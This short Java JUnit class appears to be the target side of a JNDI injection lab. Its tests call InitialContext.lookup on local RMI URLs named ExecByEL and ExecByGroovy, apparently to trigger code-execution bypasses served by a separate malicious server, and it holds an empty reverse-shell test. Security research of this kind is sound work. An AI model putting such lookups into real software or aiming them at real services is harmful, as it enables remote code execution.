import groovy.lang.GroovyShell;
import org.junit.Test;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.script.ScriptEngine;
import javax.el.ELProcessor;

public class Target {

    @Test
    public void lookupBypassByEL()throws NamingException{
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:2020/ExecByEL");
    }

    @Test
    public void lookupBypassByGroovy()throws NamingException{
        InitialContext ctx = new InitialContext();
        ctx.lookup("rmi://127.0.0.1:2020/ExecByGroovy");
    }


    @Test
    public void testRevershell() throws Exception {
//        InitialContext ctx = new InitialContext();
    }

}
